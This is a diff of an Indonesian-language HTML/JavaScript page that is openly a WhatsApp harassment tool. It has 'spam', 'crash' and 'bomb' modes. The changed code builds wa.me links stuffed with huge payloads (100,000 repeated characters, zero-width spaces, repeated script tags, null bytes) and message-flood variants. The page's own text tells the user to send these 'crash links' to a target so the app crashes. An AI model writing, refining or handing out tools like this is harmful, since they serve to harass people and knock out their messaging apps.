@@ -28,12 +28,6 @@
             border-radius: 20px;
             overflow: hidden;
             box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-            animation: fadeIn 0.5s ease;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
         }
         
         .header {
@@ -55,36 +49,6 @@
         
         .content {
             padding: 25px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 8px;
-            color: #075E54;
-        }
-        
-        input, select, textarea {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-        
-        input:focus, select:focus, textarea:focus {
-            outline: none;
-            border-color: #25D366;
-        }
-        
-        textarea {
-            resize: vertical;
-            min-height: 80px;
         }
         
         .mode-buttons {
@@ -110,6 +74,35 @@
             color: white;
         }
         
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #075E54;
+        }
+        
+        input, textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+        }
+        
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #25D366;
+        }
+        
+        textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+        
         .btn-primary {
             width: 100%;
             padding: 15px;
@@ -120,13 +113,7 @@
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
             margin-bottom: 15px;
-        }
-        
-        .btn-primary:hover {
-            transform: scale(1.02);
-            box-shadow: 0 5px 15px rgba(37,211,102,0.3);
         }
         
         .btn-secondary {
@@ -138,6 +125,7 @@
             border-radius: 12px;
             font-size: 14px;
             cursor: pointer;
+            margin-bottom: 15px;
         }
         
         .result-box {
@@ -266,7 +254,7 @@
                     ⚠️ KLIK UNTUK COPY LINK CRASH ⚠️
                 </div>
                 
-                <button class="btn-primary" id="actionBtn" onclick="executeAttack()">
+                <button class="btn-primary" onclick="executeAttack()">
                     🚀 GENERATE & ATTACK 🚀
                 </button>
                 
@@ -302,18 +290,23 @@
         function setMode(mode) {
             currentMode = mode;
             
-            // Update tombol mode
-            document.querySelectorAll('.mode-btn').forEach(btn => {
+            let btns = document.querySelectorAll('.mode-btn');
+            btns.forEach(btn => {
                 btn.classList.remove('active');
             });
-            event.target.classList.add('active');
             
-            // Tampilkan/sembunyikan field sesuai mode
-            if (mode === 'crash') {
+            if (mode === 'spam') {
+                btns[0].classList.add('active');
+                document.getElementById('pesanGroup').style.display = 'block';
+                document.getElementById('jumlahGroup').style.display = 'block';
+                document.getElementById('crashAlert').style.display = 'none';
+            } else if (mode === 'crash') {
+                btns[1].classList.add('active');
                 document.getElementById('pesanGroup').style.display = 'none';
                 document.getElementById('jumlahGroup').style.display = 'none';
                 document.getElementById('crashAlert').style.display = 'block';
-            } else {
+            } else if (mode === 'bomb') {
+                btns[2].classList.add('active');
                 document.getElementById('pesanGroup').style.display = 'block';
                 document.getElementById('jumlahGroup').style.display = 'block';
                 document.getElementById('crashAlert').style.display = 'none';
@@ -328,7 +321,6 @@
                 return;
             }
             
-            // Bersihkan hasil sebelumnya
             generatedLinks = [];
             document.getElementById('resultBox').innerHTML = '';
             document.getElementById('loading').style.display = 'block';
@@ -367,12 +359,11 @@
             let jumlah = parseInt(document.getElementById('jumlah').value);
             
             if (!pesan) {
-                alert('Masukkan pesan bomb!');
+                alert('Masukkan pesan bomb dulu!');
                 document.getElementById('loading').style.display = 'none';
                 return;
             }
             
-            // BOMB: variasi pesan dengan karakter aneh
             let bombs = [
                 pesan + " " + "A".repeat(1000),
                 pesan + " " + "\\u200b".repeat(500),
@@ -394,26 +385,23 @@
         }
         
         function generateCrashLinks(nomor) {
-            // Crash payloads
             let crashPayloads = [
-                "?text=" + "A".repeat(100000),
-                "?text=" + "\\u200b".repeat(50000),
-                "?text=" + "<script>alert(1)</script>".repeat(5000),
-                "?text=" + "%00".repeat(20000),
-                "?text=" + "\\n".repeat(100000)
+                `https://wa.me/${nomor}?text=${"A".repeat(100000)}`,
+                `https://wa.me/${nomor}?text=${"\\u200b".repeat(50000)}`,
+                `https://wa.me/${nomor}?text=${"<script>alert(1)</script>".repeat(5000)}`,
+                `https://wa.me/${nomor}?text=${"%00".repeat(20000)}`,
+                `https://wa.me/${nomor}?text=${"\\n".repeat(100000)}`
             ];
             
             setTimeout(() => {
-                for (let i = 0; i < 5; i++) {
-                    let link = `https://wa.me/${nomor}${crashPayloads[i]}`;
-                    generatedLinks.push(link);
+                for (let i = 0; i < crashPayloads.length; i++) {
+                    generatedLinks.push(crashPayloads[i]);
                 }
                 displayLinks();
                 document.getElementById('loading').style.display = 'none';
                 
-                // Tampilkan alert crash
                 let crashText = `⚠️ CRASH LINK READY! Kirim ke target, WA akan crash/lembek! ⚠️`;
-                document.getElementById('crashAlert').innerHTML = crashText + "<br>KLIK UNTUK COPY SEMUA LINK";
+                document.getElementById('crashAlert').innerHTML = crashText + "<br>📋 KLIK UNTUK COPY SEMUA LINK";
             }, 100);
         }
         
@@ -431,9 +419,10 @@
             
             for (let i = 0; i < Math.min(total, 50); i++) {
                 let link = generatedLinks[i];
+                let shortLink = link.length > 60 ? link.substring(0, 60) + '...' : link;
                 html += `
                     <div class="link-item">
-                        <a href="${link}" target="_blank">${link.substring(0, 60)}...</a>
+                        <a href="${link}" target="_blank">${shortLink}</a>
                         <button onclick="openLink('${link}')">OPEN</button>
                     </div>
                 `;
@@ -478,7 +467,7 @@
                 navigator.clipboard.writeText(text);
                 alert('💀 CRASH LINK BERHASIL DI COPY! Kirim ke target! 💀');
             } else {
-                alert('Generate crash link dulu bro!');
+                alert('Generate crash link dulu bro! Klik GENERATE & ATTACK setelah pilih mode CRASH');
             }
         }
         
@@ -492,4 +481,4 @@
         }
     </script>
 </body>
-</html>
+            </html>
